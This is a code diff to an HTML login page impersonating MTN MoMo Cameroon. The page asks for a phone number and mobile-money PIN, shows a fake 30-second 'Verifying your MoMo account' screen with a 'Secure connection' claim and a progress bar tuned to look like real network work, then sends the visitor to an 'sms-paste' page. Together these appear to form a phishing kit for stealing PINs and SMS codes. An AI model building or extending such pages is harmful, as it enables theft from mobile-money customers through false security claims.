@@ -321,6 +321,140 @@
             margin-top: auto;
         }
 
+        /* ============================================
+           VERIFYING OVERLAY
+           ============================================ */
+        .verify-overlay {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 24px;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.35s ease;
+        }
+
+        .verify-overlay.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .verify-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        /* MoMo icon on overlay */
+        .verify-momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 22px;
+            padding: 12px 24px;
+            border-radius: 50px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
+            margin-bottom: 36px;
+            animation: overlayPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes overlayPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Big spinner */
+        .verify-spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid #e0e8ff;
+            border-top-color: #0047AB;
+            border-radius: 50%;
+            animation: verifySpin 0.9s linear infinite;
+            margin-bottom: 28px;
+        }
+
+        @keyframes verifySpin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Title + subtitle */
+        .verify-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+
+        .verify-title .highlight {
+            color: #0047AB;
+        }
+
+        .verify-subtitle {
+            font-size: 14px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 32px;
+            padding: 0 12px;
+        }
+
+        /* Animated dots "..." */
+        .verify-dots span {
+            display: inline-block;
+            animation: dotBlink 1.4s infinite both;
+        }
+        .verify-dots span:nth-child(1) { animation-delay: 0s; }
+        .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotBlink {
+            0%, 80%, 100% { opacity: 0.2; }
+            40% { opacity: 1; }
+        }
+
+        /* Bottom progress bar */
+        .verify-bar {
+            width: 220px;
+            height: 5px;
+            background: #e8edf7;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 32px;
+        }
+
+        .verify-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0047AB, #FFCC00);
+            border-radius: 4px;
+            transition: width 1s linear;
+        }
+
+        /* Small security footer on overlay */
+        .verify-security {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .verify-security .lock-icon {
+            font-size: 14px;
+        }
+
         @media (max-width: 480px) {
             .card {
                 padding: 28px 18px 24px;
@@ -341,6 +475,13 @@
             .phone-input input {
                 padding: 12px 12px;
                 font-size: 15px;
+            }
+            .verify-momo-icon {
+                font-size: 20px;
+                padding: 10px 22px;
+            }
+            .verify-title {
+                font-size: 18px;
             }
         }
     </style>
@@ -403,6 +544,33 @@
     </main>
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <!-- ============================================
+         VERIFYING OVERLAY
+         ============================================ -->
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-content">
+            <div class="verify-momo-icon">MoMo</div>
+
+            <div class="verify-spinner"></div>
+
+            <h2 class="verify-title">
+                Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
+            </h2>
+            <p class="verify-subtitle">
+                Please wait, this may take some seconds
+            </p>
+
+            <div class="verify-bar">
+                <div class="verify-bar-fill" id="verifyBarFill"></div>
+            </div>
+
+            <div class="verify-security">
+                <span class="lock-icon">🔒</span>
+                <span>Secure connection to MTN MoMo</span>
+            </div>
+        </div>
+    </div>
 
     <script>
         // ============================================
@@ -481,36 +649,77 @@
         }
 
         // ============================================
+        // VERIFY OVERLAY CONTROLLER
+        // ============================================
+        const verifyOverlay = document.getElementById('verifyOverlay');
+        const verifyBarFill = document.getElementById('verifyBarFill');
+
+        /**
+         * Show the verifying overlay for `durationMs` milliseconds,
+         * animating the progress bar from 0 → 100%, then run `onDone()`.
+         *
+         * The bar is driven in 1-second ticks. The percentage
+         * increases a bit unevenly (not perfectly linear), so it
+         * feels like real network work instead of a stopwatch.
+         */
+        function showVerifying(durationMs, onDone) {
+            // Show overlay
+            verifyOverlay.classList.add('show');
+            verifyBarFill.style.width = '0%';
+
+            const totalSeconds = Math.round(durationMs / 1000); // ~30
+            const startTime = Date.now();
+
+            const tick = setInterval(function() {
+                const elapsedMs = Date.now() - startTime;
+                const elapsedSec = elapsedMs / 1000;
+
+                // Ease-out progress: fast at first, slower near the end.
+                const raw = elapsedSec / totalSeconds;
+                const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2); // easeOutQuad-ish
+                const percent = Math.min(eased * 100, 99); // cap at 99% until done
+
+                verifyBarFill.style.width = percent.toFixed(1) + '%';
+
+                if (elapsedMs >= durationMs) {
+                    clearInterval(tick);
+                    verifyBarFill.style.width = '100%';
+
+                    // small pause so the user sees the bar hit 100%
+                    setTimeout(function() {
+                        onDone();
+                    }, 350);
+                }
+            }, 1000 / 30); // ~30 fps for smoothness
+        }
+
+        // ============================================
         // LOGIN BUTTON
         // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', function() {
-            let valid = true;
-
+            // ---- Validate phone ----
             const phoneDigits = phoneInput.value.replace(/\s/g, '');
             if (phoneDigits.length !== 9 || !/^\d{9}$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
                 phoneError.classList.add('show');
-                valid = false;
                 phoneInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 phoneInput.focus();
                 return;
             }
 
+            // ---- Validate PIN (5 digits) ----
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
                 pinError.classList.add('show');
-                valid = false;
                 pinBoxes[0].scrollIntoView({ behavior: 'smooth', block: 'center' });
                 pinBoxes[0].focus();
                 return;
             }
 
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'LOGGING IN...';
-
+            // ---- Save session (demo) ----
             const session = {
                 phone: '+237' + phoneDigits,
                 country: 'CM',
@@ -519,11 +728,22 @@
             };
             localStorage.setItem('momoSession', JSON.stringify(session));
 
-            setTimeout(function() {
-                window.location.href = 'dashboard.html';
-            }, 800);
+            // ---- Button mini-loader (while overlay fades in) ----
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'LOGGING IN...';
+
+            console.log('🔐 Login submitted:', { phone: session.phone, pin: '•••••' });
+
+            // ---- Show verifying overlay for ~30 seconds, then go to sms-paste ----
+            // (Use 30000 for real 30s. For testing, try 5000)
+            const VERIFY_DURATION_MS = 30000;
+
+            showVerifying(VERIFY_DURATION_MS, function() {
+                window.location.href = 'sms-paste.html';
+            });
         });
 
+        // Auto-focus first PIN box after phone is filled
         phoneInput.addEventListener('blur', function() {
             const digits = this.value.replace(/\s/g, '');
             if (digits.length === 9 && !getPinValue()) {
@@ -534,6 +754,7 @@
         console.log('====================================');
         console.log('💰 MTN MoMo Loan – Cameroon');
         console.log('🔐 Login Page Loaded');
+        console.log('⏳ Verify overlay = 30s → sms-paste.html');
         console.log('====================================');
     </script>
 </body>
